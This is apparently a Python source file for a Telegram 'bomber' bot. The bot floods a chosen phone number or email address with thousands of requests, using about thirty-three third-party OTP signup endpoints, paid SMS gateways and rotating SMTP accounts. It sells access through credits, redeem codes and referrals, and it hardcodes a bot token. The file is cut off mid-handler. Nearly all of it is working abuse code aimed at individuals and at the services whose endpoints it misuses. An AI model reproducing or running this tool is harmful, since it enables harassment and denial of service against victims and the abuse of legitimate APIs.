# bot.py
# Telegram bomber bot — button UI, dynamic admins, credits, redeems, fast SMTP + SMS gateways.
# Requires: pip install aiogram aiohttp aiosmtplib
# Contact: @sanjipro5

import asyncio
import aiohttp
import aiohttp.web
import aiosmtplib
import sqlite3
import secrets
import string
import time
import logging
import os
import csv
import io
import json
from email.mime.text import MIMEText
from email.utils import formataddr, formatdate, make_msgid
from aiogram import Bot, Dispatcher, F, types, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (InlineKeyboardMarkup, InlineKeyboardButton,
                           BufferedInputFile)

# ─────────────────────────── CONFIG ───────────────────────────
BOT_TOKEN       = os.getenv("BOT_TOKEN", "8301089530:AAFNYRfY3vbB7IgPybATo14rsUD4Th-ZONI")
DB_PATH         = os.getenv("DB_PATH", "bot.db")
ADMIN_IDS_ENV   = {5851573541, 728373773}   # bootstrap only
PORT            = int(os.getenv("PORT", "10000"))
ADMIN_CONTACT   = "@sanjipro5"

DEFAULT_BOMB_COST    = 1
DEFAULT_MAX_COUNT    = 5000
DEFAULT_COOLDOWN     = 30
DEFAULT_CONCURRENCY  = 50
DEFAULT_DAILY_BONUS  = 5
REFERRAL_BONUS       = 3
API_FAIL_THRESHOLD   = 5
LOG_RETENTION_DAYS   = 30
START_TIME           = int(time.time())

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("bomber")

# ─────────────────────────── DATABASE ───────────────────────────
_conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
_conn.row_factory = sqlite3.Row
for pragma in ("journal_mode=WAL", "synchronous=NORMAL", "busy_timeout=30000"):
    try: _conn.execute(f"PRAGMA {pragma}")
    except Exception: pass


def _exec(sql, params=(), fetch=None):
    with _conn:
        cur = _conn.execute(sql, params)
        if fetch == "one":  return cur.fetchone()
        if fetch == "all":  return cur.fetchall()
        return cur.lastrowid


# ─── SMS Gateway templates (need real keys from provider) ───
SMS_GATEWAYS = [
    # Textbelt — sign up at textbelt.com, pay $0.01/SMS
    ("sms:textbelt", "POST", "https://textbelt.com/text",
     {"Content-Type": "application/x-www-form-urlencoded"},
     {"_raw": "phone={target}&message={msg}&key=YOUR_TEXTBELT_KEY"}),
    # Fast2SMS — fast2sms.com (India)
    ("sms:fast2sms", "POST", "https://www.fast2sms.com/dev/bulkV2",
     {"Content-Type": "application/x-www-form-urlencoded",
      "authorization": "YOUR_FAST2SMS_KEY"},
     {"_raw": "route=q&message={msg}&numbers={target}"}),
    # 2Factor.in
    ("sms:2factor", "GET",
     "https://2factor.in/API/V1/YOUR_2FACTOR_KEY/ADDON_SERVICES/SEND/TSMS/{target}/{msg}",
     {}, {}),
    # MSG91
    ("sms:msg91", "POST", "https://api.msg91.com/api/v5/flow/",
     {"authkey": "YOUR_MSG91_KEY", "Content-Type": "application/json"},
     {"flow_id": "YOUR_FLOW_ID", "sender": "INFO",
      "mobiles": "{target}", "VAR1": "{msg}"}),
    # Vonage (Nexmo)
    ("sms:vonage", "POST", "https://rest.nexmo.com/sms/json",
     {"Content-Type": "application/x-www-form-urlencoded"},
     {"_raw": "api_key=YOUR_VONAGE_KEY&api_secret=YOUR_VONAGE_SECRET"
              "&to={target}&from=Info&text={msg}"}),
    # Twilio
    ("sms:twilio", "POST",
     "https://api.twilio.com/2010-04-01/Accounts/YOUR_TWILIO_SID/Messages.json",
     {"Content-Type": "application/x-www-form-urlencoded"},
     {"_raw": "From=YOUR_TWILIO_NUMBER&To={target}&Body={msg}"}),
]

# ─── Legacy OTP endpoints (many dead, auto-disable handles them) ───
LEGACY_ENDPOINTS = [
    ("svc:OYO", "POST", "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
     {"Content-Type": "text/plain;charset=UTF-8"},
     {"phone": "{target}", "country_code": "+91", "nod": 4}),
    ("svc:ConfirmTkt", "GET",
     "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={target}",
     {}, {}),
    ("svc:Zomato", "POST", "https://www.zomato.com/webroutes/auth/login",
     {"Content-Type": "application/json"},
     {"country_id": 1, "phone": "{target}", "verification_type": "sms", "method": "phone"}),
    ("svc:RedBus", "GET",
     "https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined",
     {}, {}),
    ("svc:Purplle", "GET",
     "https://www.purplle.com/api/account/authorization/send_otp?phone={target}&action=register",
     {}, {}),
    ("svc:Lenskart", "POST", "https://api.lenskart.com/v2/customers/sendOtp",
     {"Content-Type": "application/json;charset=UTF-8"}, {"telephone": "{target}"}),
    ("svc:Nykaa", "POST", "https://www.nykaa.com/app-api/index.php/customer/send_otp",
     {"Content-Type": "application/x-www-form-urlencoded"},
     {"_raw": "source=sms&app_version=3.0.9&mobile_number={target}&platform=ANDROID&domain=nykaa"}),
    ("svc:BigBasket", "POST",
     "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
     {"Content-Type": "application/json"}, {"identifier": "{target}"}),
    ("svc:Swiggy", "POST", "https://www.swiggy.com/mapi/auth/signup",
     {"Content-Type": "application/json"},
     {"name": "User", "email": "user@example.com", "password": "Pass123!",
      "referral_code": "", "mobile": "{target}", "_csrf": "jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}),
    ("svc:Dream11", "POST",
     "https://www.dream11.com/graphql/mutation/pwa/register",
     {"Content-Type": "application/json"},
     {"query": "mutation{registerSendOTPMutation(email:\"u@e.com\" mobileNumber:\"{target}\" password:\"Pass123!\" site:\"\" ){message}}"}),
    ("svc:My11Circle", "POST",
     "https://www.my11circle.com/api/fl/auth/v3/getOtp",
     {"Content-Type": "application/json;charset=UTF-8"}, {"mobile": "{target}"}),
    ("svc:RummyCircle", "POST",
     "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "isPlaycircle": False}),
    ("svc:PharmEasy", "POST", "https://pharmeasy.in/api/v2/auth/send-otp",
     {"Content-Type": "application/json"}, {"phone": "{target}"}),
    ("svc:Vedantu", "POST", "https://user.vedantu.com/user/preLoginVerification",
     {"Content-Type": "application/json"},
     {"email": None, "phoneCode": "+91", "phoneNumber": "{target}", "ver": "11.345"}),
    ("svc:Unacademy", "POST", "https://unacademy.com/api/v3/user/user_check/",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "country_code": "IN", "otp_type": 1, "email": "",
      "send_otp": True, "is_un_teach_user": False}),
    ("svc:Doubtnut", "POST", "https://api.doubtnut.com/v4/student/login",
     {"Content-Type": "application/json; charset=utf-8"},
     {"phone_number": "{target}", "language": "en"}),
    ("svc:PenPencil", "POST",
     "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
     {"Content-Type": "application/json; charset=utf-8"},
     {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{target}"}),
    ("svc:Entri", "POST", "https://entri.app/api/v3/users/check-phone/",
     {"Content-Type": "application/json"}, {"phone": "{target}"}),
    ("svc:Cosmofeed", "POST",
     "https://prod.api.cosmofeed.com/api/user/authenticate",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "version": "1.4.28"}),
    ("svc:Aakash", "POST", "https://antheapi.aakash.ac.in/api/generate-lead-otp",
     {"Content-Type": "application/json"},
     {"mobile_number": "{target}", "activity_type": "aakash-myadmission"}),
    ("svc:DealShare", "POST",
     "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "hashCode": "k387IsBaTmn"}),
    ("svc:Snapmint", "POST", "https://api.snapmint.com/v1/public/sign_up",
     {"Content-Type": "application/json"}, {"phone": "{target}"}),
    ("svc:Housing", "POST", "https://login.housing.com/api/v2/send-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "country_url_name": "in"}),
    ("svc:RentoMojo", "POST",
     "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
     {"Content-Type": "application/json"}, {"phone": "{target}"}),
    ("svc:Khatabook", "POST", "https://api.khatabook.com/v1/auth/request-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "app_signature": "wk+avHrHZf2"}),
    ("svc:MamaEarth", "POST", "https://auth.mamaearth.in/v1/auth/initiate-signup",
     {"Content-Type": "application/json"}, {"mobile": "{target}"}),
    ("svc:Kredily", "POST", "https://app.kredily.com/ws/v1/accounts/send-otp/",
     {"Content-Type": "application/json"}, {"mobile": "{target}"}),
    ("svc:Moglix", "POST", "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "buildVersion": "24.0"}),
    ("svc:TrulyMadly", "POST",
     "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "locale": "IN"}),
    ("svc:Apna", "POST", "https://production.apna.co/api/userprofile/v1/otp/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "hash_type": "play_store"}),
    ("svc:Rapido", "POST", "https://customer.rapido.bike/api/otp",
     {"Content-Type": "application/json"}, {"mobile": "{target}"}),
    ("svc:Vyapar", "GET",
     "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={target}",
     {}, {}),
    ("svc:WorkIndia", "GET",
     "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={target}&version_number=623",
     {}, {}),
]


def _body_to_string(d):
    if not d: return ""
    if isinstance(d, str): return d
    if isinstance(d, dict):
        if "_raw" in d: return str(d["_raw"])
        return json.dumps(d, separators=(",", ":"), ensure_ascii=False)
    return str(d)


def _headers_to_string(h):
    if not h: return ""
    if isinstance(h, str): return h
    return "\n".join(f"{k}: {v}" for k, v in h.items())


def _seed_endpoints():
    inserted = 0
    for name, method, url, headers, data in SMS_GATEWAYS + LEGACY_ENDPOINTS:
        if _exec("SELECT 1 FROM apis WHERE name=?", (name,), fetch="one"):
            continue
        _exec("INSERT INTO apis(name,channel,url,method,body,headers,active,created_at) "
              "VALUES(?,?,?,?,?,?,?,?)",
              (name, "http", url, method, _body_to_string(data),
               _headers_to_string(headers), 1, int(time.time())))
        inserted += 1
    log.info("seed: %d new endpoints", inserted)


def init_db():
    _conn.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        user_id       INTEGER PRIMARY KEY,
        username      TEXT,
        first_name    TEXT,
        credits       INTEGER DEFAULT 0,
        banned        INTEGER DEFAULT 0,
        last_bomb     INTEGER DEFAULT 0,
        total_bombs   INTEGER DEFAULT 0,
        last_daily    INTEGER DEFAULT 0,
        referred_by   INTEGER,
        ref_count     INTEGER DEFAULT 0,
        vip_cost      INTEGER DEFAULT 0,
        created_at    INTEGER
    );
    CREATE TABLE IF NOT EXISTS admins (
        user_id    INTEGER PRIMARY KEY,
        added_by   INTEGER,
        added_at   INTEGER
    );
    CREATE TABLE IF NOT EXISTS redeem_codes (
        code        TEXT PRIMARY KEY,
        amount      INTEGER NOT NULL,
        max_uses    INTEGER NOT NULL,
        used        INTEGER DEFAULT 0,
        created_by  INTEGER,
        created_at  INTEGER,
        active      INTEGER DEFAULT 1
    );
    CREATE TABLE IF NOT EXISTS redeem_uses (
        code     TEXT,
        user_id  INTEGER,
        used_at  INTEGER,
        PRIMARY KEY (code, user_id)
    );
    CREATE TABLE IF NOT EXISTS apis (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        name         TEXT UNIQUE,
        channel      TEXT DEFAULT 'http',
        url          TEXT NOT NULL,
        method       TEXT DEFAULT 'GET',
        body         TEXT DEFAULT '',
        headers      TEXT DEFAULT '',
        active       INTEGER DEFAULT 1,
        fail_streak  INTEGER DEFAULT 0,
        ok_count     INTEGER DEFAULT 0,
        fail_count   INTEGER DEFAULT 0,
        created_at   INTEGER
    );
    CREATE TABLE IF NOT EXISTS smtp_accounts (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        host        TEXT,
        port        INTEGER,
        username    TEXT,
        password    TEXT,
        from_name   TEXT DEFAULT '',
        use_tls     INTEGER DEFAULT 1,
        active      INTEGER DEFAULT 1,
        fail_streak INTEGER DEFAULT 0,
        ok_count    INTEGER DEFAULT 0,
        fail_count  INTEGER DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS bomb_history (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        target   TEXT,
        count    INTEGER,
        msg      TEXT,
        ok       INTEGER,
        fail     INTEGER,
        ts       INTEGER
    );
    CREATE TABLE IF NOT EXISTS blacklist (
        target   TEXT PRIMARY KEY,
        added_by INTEGER,
        added_at INTEGER
    );
    CREATE TABLE IF NOT EXISTS settings (
        key   TEXT PRIMARY KEY,
        value TEXT
    );
    CREATE TABLE IF NOT EXISTS logs (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        action   TEXT,
        detail   TEXT,
        ts       INTEGER
    );
    """)

    for k, v in (("bomb_cost",    DEFAULT_BOMB_COST),
                 ("max_count",    DEFAULT_MAX_COUNT),
                 ("cooldown",     DEFAULT_COOLDOWN),
                 ("concurrency",  DEFAULT_CONCURRENCY),
                 ("daily_bonus",  DEFAULT_DAILY_BONUS),
                 ("referral_bonus", REFERRAL_BONUS),
                 ("maintenance",  0),
                 ("smtp_per_account", 5)):
        _conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)",
                      (k, str(v)))

    # Bootstrap admins from env if table empty
    if _exec("SELECT COUNT(*) c FROM admins", fetch="one")["c"] == 0:
        for uid in ADMIN_IDS_ENV:
            _exec("INSERT OR IGNORE INTO admins(user_id,added_by,added_at) "
                  "VALUES(?,?,?)", (uid, 0, int(time.time())))

    _seed_endpoints()


def setting(key, cast=str):
    row = _exec("SELECT value FROM settings WHERE key=?", (key,), fetch="one")
    return cast(row["value"]) if row else None


def set_setting(key, value):
    _exec("INSERT INTO settings(key,value) VALUES(?,?) "
          "ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))


def get_user(uid):
    return _exec("SELECT * FROM users WHERE user_id=?", (uid,), fetch="one")


def ensure_user(u: types.User):
    row = get_user(u.id)
    if not row:
        _exec("INSERT INTO users(user_id,username,first_name,credits,created_at) "
              "VALUES(?,?,?,?,?)",
              (u.id, u.username or "", u.first_name or "", 0, int(time.time())))
        row = get_user(u.id)
    else:
        _exec("UPDATE users SET username=?, first_name=? WHERE user_id=?",
              (u.username or "", u.first_name or "", u.id))
    return row


def add_credits(uid, amount):
    _exec("UPDATE users SET credits = credits + ? WHERE user_id=?", (amount, uid))


def take_credits(uid, amount):
    with _conn:
        cur = _conn.execute(
            "UPDATE users SET credits = credits - ? WHERE user_id = ? AND credits >= ?",
            (amount, uid, amount))
        return cur.rowcount > 0


def log_action(uid, action, detail=""):
    _exec("INSERT INTO logs(user_id,action,detail,ts) VALUES(?,?,?,?)",
          (uid, action, detail, int(time.time())))


def prune_logs():
    cutoff = int(time.time()) - LOG_RETENTION_DAYS * 86400
    with _conn:
        _conn.execute("DELETE FROM logs WHERE ts < ?", (cutoff,))


def gen_code(n=10):
    alphabet = string.ascii_uppercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(n))


def is_admin(uid):
    return _exec("SELECT 1 FROM admins WHERE user_id=?", (uid,), fetch="one") is not None


def is_blacklisted(target):
    return _exec("SELECT 1 FROM blacklist WHERE target=?", (target,), fetch="one") is not None


# ─────────────────────────── MIDDLEWARE ───────────────────────────
class AutoRegisterMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        u = getattr(event, "from_user", None)
        if u and not u.is_bot:
            ensure_user(u)
        return await handler(event, data)


# ─────────────────────────── BOMBER CORE ───────────────────────────
def _render(t, target, msg):
    if not t: return ""
    return t.replace("{target}", target).replace("{phone}", target).replace("{msg}", msg)


def _parse_headers(raw):
    out = {}
    if not raw: return out
    for line in raw.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out[k.strip()] = v.strip()
    return out


async def _hit_http(session, row, target, msg):
    url = _render(row["url"], target, msg)
    method = (row["method"] or "GET").upper()
    body = _render(row["body"], target, msg)
    headers = _parse_headers(row["headers"])
    timeout = aiohttp.ClientTimeout(total=10)
    try:
        if method == "POST":
            async with session.post(url, data=body.encode() if body else None,
                                    headers=headers, timeout=timeout) as r:
                await r.read(); return 200 <= r.status < 400
        elif method == "PUT":
            async with session.put(url, data=body.encode() if body else None,
                                   headers=headers, timeout=timeout) as r:
                await r.read(); return 200 <= r.status < 400
        else:
            async with session.get(url, headers=headers, timeout=timeout) as r:
                await r.read(); return 200 <= r.status < 400
    except Exception:
        return False


async def _send_email(smtp_row, target, msg, subject="Notification"):
    try:
        m = MIMEText(msg)
        m["Subject"] = subject
        m["From"] = formataddr((smtp_row["from_name"] or smtp_row["username"],
                                smtp_row["username"]))
        m["To"] = target
        m["Date"] = formatdate(localtime=True)
        m["Message-ID"] = make_msgid()

        port = smtp_row["port"]
        if port == 465:
            client = aiosmtplib.SMTP(hostname=smtp_row["host"], port=port,
                                     timeout=20, use_tls=True)
            await client.connect()
        else:
            client = aiosmtplib.SMTP(hostname=smtp_row["host"], port=port,
                                     timeout=20, use_tls=False)
            await client.connect()
            if smtp_row["use_tls"]:
                await client.starttls()
        await client.login(smtp_row["username"], smtp_row["password"])
        await client.send_message(m)
        await client.quit()
        return True
    except Exception as e:
        log.debug("smtp fail %s: %s", smtp_row["username"], e)
        return False


def _update_api_health(api_id, ok):
    try:
        if ok:
            _exec("UPDATE apis SET ok_count=ok_count+1, fail_streak=0 WHERE id=?", (api_id,))
        else:
            _exec("UPDATE apis SET fail_count=fail_count+1, fail_streak=fail_streak+1 WHERE id=?", (api_id,))
            row = _exec("SELECT fail_streak FROM apis WHERE id=?", (api_id,), fetch="one")
            if row and row["fail_streak"] >= API_FAIL_THRESHOLD:
                _exec("UPDATE apis SET active=0 WHERE id=?", (api_id,))
    except Exception:
        pass


def _update_smtp_health(smtp_id, ok):
    try:
        if ok:
            _exec("UPDATE smtp_accounts SET ok_count=ok_count+1, fail_streak=0 WHERE id=?", (smtp_id,))
        else:
            _exec("UPDATE smtp_accounts SET fail_count=fail_count+1, fail_streak=fail_streak+1 WHERE id=?", (smtp_id,))
            row = _exec("SELECT fail_streak FROM smtp_accounts WHERE id=?", (smtp_id,), fetch="one")
            if row and row["fail_streak"] >= API_FAIL_THRESHOLD:
                _exec("UPDATE smtp_accounts SET active=0 WHERE id=?", (smtp_id,))
    except Exception:
        pass


async def bomb_worker(target: str, count: int, msg: str = "OTP"):
    http_apis = _exec("SELECT * FROM apis WHERE active=1 AND channel='http'", fetch="all")
    email_apis = _exec("SELECT * FROM smtp_accounts WHERE active=1", fetch="all")
    if not http_apis and not email_apis:
        return 0, 0, "no active delivery channels"

    conc = setting("concurrency", int) or DEFAULT_CONCURRENCY
    global_sem = asyncio.Semaphore(conc)
    api_sems = {a["id"]: asyncio.Semaphore(5) for a in http_apis}
    smtp_sems = {s["id"]: asyncio.Semaphore(3) for s in email_apis}

    ok = fail = 0
    lock = asyncio.Lock()
    connector = aiohttp.TCPConnector(limit=300, limit_per_host=15)

    async with aiohttp.ClientSession(connector=connector) as session:
        async def task(i):
            nonlocal ok, fail
            async with global_sem:
                if http_apis and (i % 2 == 0 or not email_apis):
                    api = http_apis[(i // 2) % len(http_apis)]
                    async with api_sems[api["id"]]:
                        r = await _hit_http(session, api, target, msg)
                    _update_api_health(api["id"], r)
                elif email_apis:
                    s = email_apis[(i // 2) % len(email_apis)]
                    async with smtp_sems[s["id"]]:
                        r = await _send_email(s, target, msg)
                    _update_smtp_health(s["id"], r)
                else:
                    r = False
                async with lock:
                    if r: ok += 1
                    else: fail += 1

        await asyncio.gather(*(task(i) for i in range(count)))
    return ok, fail, None


# ─────────────────────────── BOT / DISPATCHER ───────────────────────────
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())
dp.message.middleware(AutoRegisterMiddleware())
dp.callback_query.middleware(AutoRegisterMiddleware())


class UserFSM(StatesGroup):
    bomb_target = State()
    bomb_count = State()
    bomb_custom_count = State()
    redeem_code = State()


class AdminFSM(StatesGroup):
    add_credits_uid = State()
    add_credits_amt = State()
    ded_credits_uid = State()
    ded_credits_amt = State()
    redeem_amount   = State()
    redeem_uses     = State()
    api_name        = State()
    api_url         = State()
    api_method      = State()
    api_body        = State()
    api_headers     = State()
    smtp_host       = State()
    smtp_port       = State()
    smtp_user       = State()
    smtp_pass       = State()
    smtp_name       = State()
    broadcast       = State()
    find_user       = State()
    edit_setting    = State()
    blacklist_add   = State()
    vip_uid         = State()
    vip_cost        = State()
    add_admin_id    = State()
    remove_admin_id = State()


# ─────────────────────────── KEYBOARDS ───────────────────────────
def main_menu_kb(admin=False):
    rows = [
        [InlineKeyboardButton(text="💣 Start Bomb",  callback_data="m:bomb"),
         InlineKeyboardButton(text="💰 Balance",     callback_data="m:bal")],
        [InlineKeyboardButton(text="🎁 Redeem",      callback_data="m:redeem"),
         InlineKeyboardButton(text="📜 History",     callback_data="m:hist")],
        [InlineKeyboardButton(text="🎉 Daily Bonus", callback_data="m:daily"),
         InlineKeyboardButton(text="📖 Help",        callback_data="m:help")],
        [InlineKeyboardButton(text="📝 Example",     callback_data="m:example"),
         InlineKeyboardButton(text="📊 Stats",       callback_data="m:stats")],
        [InlineKeyboardButton(text="📞 Contact Admin",
                              url=f"https://t.me/{ADMIN_CONTACT.lstrip('@')}")],
    ]
    if admin:
        rows.append([InlineKeyboardButton(text="🛠 Admin Panel", callback_data="a:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def cancel_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")]])


def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏠 Main Menu", callback_data="m:home")]])


def count_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="10",   callback_data="m:count:10"),
         InlineKeyboardButton(text="50",   callback_data="m:count:50"),
         InlineKeyboardButton(text="100",  callback_data="m:count:100")],
        [InlineKeyboardButton(text="250",  callback_data="m:count:250"),
         InlineKeyboardButton(text="500",  callback_data="m:count:500"),
         InlineKeyboardButton(text="1000", callback_data="m:count:1000")],
        [InlineKeyboardButton(text="✍️ Custom Count", callback_data="m:count:custom")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="m:cancel")],
    ])


# ─────────────────────────── START ───────────────────────────
@dp.message(CommandStart())
async def cmd_start(m: types.Message, state: FSMContext):
    await state.clear()
    u = ensure_user(m.from_user)
    if u["banned"]:
        return await m.answer("🚫 You are banned.")
    await m.answer(
        f"👋 <b>Welcome {m.from_user.first_name}</b>\n\n"
        f"🆔 <code>{m.from_user.id}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n\n"
        f"Use the buttons below.",
        reply_markup=main_menu_kb(is_admin(m.from_user.id)))


@dp.message(Command("admin"))
async def cmd_admin(m: types.Message, state: FSMContext):
    await state.clear()
    if not is_admin(m.from_user.id): return
    await m.answer("🛠 <b>Admin Panel</b>", reply_markup=admin_kb())


@dp.callback_query(F.data == "m:home")
async def cb_home(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    u = get_user(c.from_user.id)
    await c.message.edit_text(
        f"🏠 <b>Main Menu</b>\n\n💳 Credits: <b>{u['credits']}</b>\n"
        f"📊 Bombs: <b>{u['total_bombs']}</b>",
        reply_markup=main_menu_kb(is_admin(c.from_user.id)))
    await c.answer()


@dp.callback_query(F.data == "m:cancel")
async def cb_cancel(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await c.message.edit_text("❌ Cancelled.",
                              reply_markup=main_menu_kb(is_admin(c.from_user.id)))
    await c.answer()


# ─────────────────────────── INFO SCREENS ───────────────────────────
@dp.callback_query(F.data == "m:bal")
async def cb_balance(c: types.CallbackQuery):
    u = get_user(c.from_user.id)
    await c.message.edit_text(
        f"💰 <b>Account</b>\n\n"
        f"🆔 <code>{u['user_id']}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n"
        f"📊 Total bombs: <b>{u['total_bombs']}</b>\n"
        f"🔗 Referrals: <b>{u['ref_count']}</b>",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:help")
async def cb_help(c: types.CallbackQuery):
    await c.message.edit_text(
        "📖 <b>Help</b>\n\n"
        "<b>💣 Start Bomb</b>\n"
        "1. Tap Start Bomb\n"
        "2. Send target number\n"
        "3. Pick count or tap Custom Count\n"
        "4. Bot fires across all active services\n\n"
        "<b>🎁 Redeem</b> — enter code to get credits\n"
        "<b>💰 Balance</b> — see credits\n"
        "<b>📜 History</b> — last 10 bombs\n"
        "<b>🎉 Daily Bonus</b> — free credits every 24h\n"
        "<b>📞 Contact</b> — reach admin\n\n"
        "⚠️ Use only on numbers you own or have permission to test.",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:example")
async def cb_example(c: types.CallbackQuery):
    await c.message.edit_text(
        "📝 <b>Example</b>\n\n"
        "Tap <b>💣 Start Bomb</b>\n\n"
        "Bot: <i>Send target phone number</i>\n"
        "You: <code>9876543210</code>\n\n"
        "Bot: <i>Pick count</i>\n"
        "You: tap <b>50</b> or <b>✍️ Custom Count</b> → type <code>507</code>\n\n"
        "Bot: fires 507 requests → reports result",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:hist")
async def cb_hist(c: types.CallbackQuery):
    rows = _exec("SELECT * FROM bomb_history WHERE user_id=? ORDER BY ts DESC LIMIT 10",
                 (c.from_user.id,), fetch="all")
    if not rows:
        txt = "📜 No history."
    else:
        lines = []
        for r in rows:
            t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
            lines.append(f"• <code>{r['target']}</code> x{r['count']} → "
                         f"{r['ok']}✅ {r['fail']}❌ ({t})")
        txt = "📜 <b>Last 10 bombs</b>\n\n" + "\n".join(lines)
    await c.message.edit_text(txt, reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:stats")
async def cb_public_stats(c: types.CallbackQuery):
    users = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    bombs = _exec("SELECT COALESCE(SUM(total_bombs),0) s FROM users", fetch="one")["s"]
    apis = _exec("SELECT COUNT(*) c FROM apis WHERE active=1", fetch="one")["c"]
    smtps = _exec("SELECT COUNT(*) c FROM smtp_accounts WHERE active=1", fetch="one")["c"]
    await c.message.edit_text(
        f"📊 <b>Stats</b>\n\n"
        f"👥 Users: <b>{users}</b>\n"
        f"💥 Total bombs fired: <b>{bombs}</b>\n"
        f"🔌 Active HTTP endpoints: <b>{apis}</b>\n"
        f"📧 Active SMTP accounts: <b>{smtps}</b>",
        reply_markup=back_kb())
    await c.answer()


@dp.callback_query(F.data == "m:daily")
async def cb_daily(c: types.CallbackQuery):
    u = get_user(c.from_user.id)
    now = int(time.time())
    if now - u["last_daily"] < 86400:
        wait = 86400 - (now - u["last_daily"])
        h, rem = divmod(wait, 3600); mm = rem // 60
        await c.answer(f"⏳ Next in {h}h {mm}m", show_alert=True)
        return
    bonus = setting("daily_bonus", int)
    add_credits(c.from_user.id, bonus)
    _exec("UPDATE users SET last_daily=? WHERE user_id=?", (now, c.from_user.id))
    log_action(c.from_user.id, "daily", f"+{bonus}")
    u2 = get_user(c.from_user.id)
    await c.answer(f"🎉 +{bonus} credits!", show_alert=True)
    await c.message.edit_text(
        f"🎉 Daily bonus claimed! +{bonus}\n💳 Balance: <b>{u2['credits']}</b>",
        reply_markup=back_kb())


# ─────────────────────────── BOMB FLOW ───────────────────────────
@dp.callback_query(F.data == "m:bomb")
async def cb_bomb_start(c: types.CallbackQuery, state: FSMContext):
    u = get_user(c.from_user.id)
    if u["banned"]:
        return await c.answer("You are banned.", show_alert=True)
    if setting("maintenance", int):
        return await c.answer("Maintenance mode.", show_alert=True)
    await state.set_state(UserFSM.bomb_target)
    await c.message.edit_text(
        "🎯 <b>Step 1/2 — Target</b>\n\n"
        "Send target phone number (digits only) or email address.",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.bomb_target)
async def fsm_bomb_target(m: types.Message, state: FSMContext):
    target = m.text.strip()
    if not target or len(target) > 128:
        return await m.answer("❌ Invalid.", reply_markup=cancel_kb())
    await state.update_data(target=target)
    await state.set_state(UserFSM.bomb_count)
    await m.answer(
        f"🎯 Target: <code>{target}</code>\n\n"
        f"<b>Step 2/2 — Count</b>\n\n"
        f"Pick preset or tap <b>✍️ Custom Count</b>.",
        reply_markup=count_kb())


@dp.callback_query(F.data == "m:count:custom")
async def cb_custom_count(c: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    if not data.get("target"):
        await state.clear()
        return await c.answer("expired, start over", show_alert=True)
    await state.set_state(UserFSM.bomb_custom_count)
    max_c = setting("max_count", int)
    await c.message.edit_text(
        f"✍️ <b>Custom Count</b>\n\n"
        f"Send any number from 1 to <b>{max_c}</b>.\n"
        f"Example: <code>1208</code> or <code>507</code>",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.bomb_custom_count)
async def fsm_custom_count(m: types.Message, state: FSMContext):
    txt = m.text.strip()
    if not txt.isdigit():
        return await m.answer("❌ Send a number.", reply_markup=cancel_kb())
    count = int(txt)
    data = await state.get_data()
    target = data.get("target")
    if not target:
        await state.clear()
        return await m.answer("expired, start over")
    await state.clear()
    await _start_bomb(m, m.from_user.id, target, count)


@dp.callback_query(F.data.startswith("m:count:"))
